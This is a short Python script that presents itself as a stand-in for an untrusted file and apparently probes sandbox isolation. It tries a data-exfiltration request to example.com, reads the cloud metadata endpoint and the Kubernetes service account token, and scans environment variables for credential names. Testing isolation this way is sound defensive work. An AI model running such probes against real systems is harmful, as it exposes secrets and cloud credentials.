"""Stand-in for a file you do not trust: a customer upload, an email
attachment, a script from a ticket. It does what such a file tends to do."""
import os
import socket
import urllib.request


def attempt(label, fn):
    try:
        print(f"[worked ] {label}: {fn()}")
    except Exception as e:
        print(f"[blocked] {label}: {type(e).__name__}: {e}")


def phone_home():
    return urllib.request.urlopen("https://example.com/exfil?d=secrets", timeout=5).status


def cloud_metadata():
    return urllib.request.urlopen("http://169.254.169.254/latest/meta-data/", timeout=3).read()[:40]


def kubernetes_api():
    return socket.create_connection(("kubernetes.default.svc", 443), timeout=3).getpeername()


def service_account_token():
    return open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()[:20] + "..."


def cloud_credentials():
    found = [k for k in os.environ if any(s in k for s in ("API_KEY", "ACCESS_KEY", "TOKEN", "SECRET", "PASSWORD"))]
    if not found:
        raise LookupError("no credentials in the environment")
    return found


attempt("phone home to example.com", phone_home)
attempt("read cloud metadata service", cloud_metadata)
attempt("reach the Kubernetes API", kubernetes_api)
attempt("read a service account token", service_account_token)
attempt("find credentials in env vars", cloud_credentials)
print("whoami:", os.popen("id -un").read().strip(), "| hostname:", socket.gethostname())
